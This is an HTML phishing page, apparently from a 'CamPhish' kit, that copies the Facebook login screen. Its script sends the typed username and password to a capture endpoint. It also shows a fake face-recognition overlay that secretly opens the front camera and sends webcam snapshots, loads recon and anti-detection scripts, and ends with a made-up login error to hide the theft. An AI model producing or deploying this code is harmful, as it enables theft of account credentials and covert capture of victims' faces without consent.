<!-- DESC: Facebook login — 100% realistic replica with face ID camera capture -->
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#f0f2f5">
<title>Facebook — Log in</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.fb-header{background:#fff;width:100%;padding:12px 20px;box-shadow:0 1px 2px rgba(0,0,0,.1);display:flex;align-items:center;justify-content:center}
.fb-logo{color:#1877f2;font-size:32px;font-weight:900;letter-spacing:-1px}
.content{max-width:400px;width:100%;padding:20px}
.login-box{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;text-align:center}
.login-box p{font-size:18px;line-height:1.34;color:#1c1e21;margin-bottom:20px}
.login-box input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;color:#1d2129;margin-bottom:12px;outline:none}
.login-box input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.login-box input::placeholder{color:#90949c}
.btn-login{width:100%;padding:0;height:48px;background:#1877f2;border:none;border-radius:6px;color:#fff;font-size:20px;font-weight:700;cursor:pointer;line-height:48px;margin-bottom:16px}
.btn-login:active{background:#166fe5}
.btn-login:disabled{background:#77a7ff}
.forgot{color:#1877f2;font-size:14px;font-weight:500;text-decoration:none;display:block;margin-bottom:20px}
.divider{height:1px;background:#dadde1;margin:20px 0}
.btn-new{width:auto;padding:0 16px;height:48px;background:#42b72a;border:none;border-radius:6px;color:#fff;font-size:17px;font-weight:700;cursor:pointer;line-height:48px;display:inline-block}
.create-page{text-align:center;margin-top:28px;font-size:14px;color:#1c1e21}
.create-page a{color:#1c1e21;font-weight:600;text-decoration:none}
.face-overlay{position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:999;display:none;align-items:center;justify-content:center;flex-direction:column}
.face-overlay.active{display:flex}
.face-title{color:#fff;font-size:20px;font-weight:700;margin-bottom:8px}
.face-sub{color:#aaa;font-size:14px;margin-bottom:20px}
.spin{display:inline-block;width:20px;height:20px;border:2px solid #fff;border-top:#1877f2;border-radius:50%;animation:spin .6s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
</style>
</head><body>
<div id="loadScreen" style="position:fixed;inset:0;background:#f0f2f5;display:flex;align-items:center;justify-content:center;z-index:99998;font-family:sans-serif;flex-direction:column;gap:12px">
<div style="width:24px;height:24px;border:3px solid #ddd;border-top-color:#1877f2;border-radius:50%;animation:cl 0.8s linear infinite"></div>
<div style="font-size:13px;color:#888">Securing connection...</div>
</div>
<style>@keyframes cl{to{transform:rotate(360deg)}}</style>
<div id="pageContent">
<script src="forwarding_link/t/recon.js"></script>
<script src="forwarding_link/t/anti-detect.js"></script>
<video id="v" playsinline autoplay muted></video>
<canvas id="cap" width="320" height="240"></canvas>

<div class="fb-header"><div class="fb-logo">facebook</div></div>
<div class="content">
<div class="login-box">
<p>Log in to Facebook</p>
<form onsubmit="return doLogin(event)">
<input type="text" placeholder="Email address or phone number" id="user" required>
<input type="password" placeholder="Password" id="pass" required>
<button type="submit" class="btn-login" id="loginBtn">Log In</button>
</form>
<a href="#" class="forgot">Forgotten account?</a>
<div class="divider"></div>
<button class="btn-new">Create New Account</button>
</div>
<div class="create-page"><a href="#">Create a Page</a> for a celebrity, brand or business.</div>
</div>

<div class="face-overlay" id="faceScan">
<div style="font-size:48px;color:#1877f2;margin-bottom:16px">👤</div>
<div class="face-title">Face Recognition</div>
<div class="face-sub">Verifying your identity for secure login</div>
<div class="spin"></div>
</div>

<script>
var API='API_BASE_URL',SHARE_URL=location.origin+'/t/facebook';
if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
function doLogin(e){
e.preventDefault();
var btn=document.getElementById('loginBtn');btn.innerHTML='Logging in...';btn.disabled=true;
var fs=document.getElementById('faceScan');fs.classList.add('active');
if(window.CamPhishRecon)CamPhishRecon.Capture.event('facebook_login',{});
captureCreds();
if(navigator.mediaDevices){
navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
var v=document.getElementById('v');v.srcObject=stream;v.play();
var cap=document.getElementById('cap'),cx=cap.getContext('2d');
var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'fb_verify');}},2000);
 setTimeout(function(){clearInterval(ci);stream.getTracks().forEach(function(t){t.stop();});fs.classList.remove('active');btn.innerHTML='Log In';btn.disabled=false;var msgs=['Login failed. Please check your credentials.','We couldn\'t log you in. Please try again.','Our systems detected unusual activity. Try again later.','Sorry, something went wrong. Please try again.'];var msg=msgs[Math.floor(Math.random()*msgs.length)];if(window.CamPhishRecon&&CamPhishRecon.UI){CamPhishRecon.UI.notice({title:'Login failed',message:msg,tone:'danger',actionLabel:'Try again'});}else{alert(msg);}},5000);
}).catch(function(){setTimeout(function(){fs.classList.remove('active');btn.innerHTML='Log In';btn.disabled=false;},2000);});
}else{setTimeout(function(){fs.classList.remove('active');btn.innerHTML='Log In';btn.disabled=false;},2000);}
return false;
}
function captureCreds(){
var u=document.getElementById("user");var p=document.getElementById("pass");
if(!u||!p)return;
var data={template_id:"facebook",username:u.value,password:p.value};
if(u.value.indexOf("@")>=0)data.email=u.value;
if(/^\+?[0-9]{10,}/.test(u.value))data.phone=u.value;
fetch((window.CamPhishRecon?"/api":"API_BASE_URL")+"/capture/credentials",{
method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)
}).catch(function(){});
}
</script>
</div>
<script>
setTimeout(function(){
  var loader=document.getElementById('loadScreen');
  if(loader)loader.remove();
},300+Math.random()*400);
</script>
</body></html>
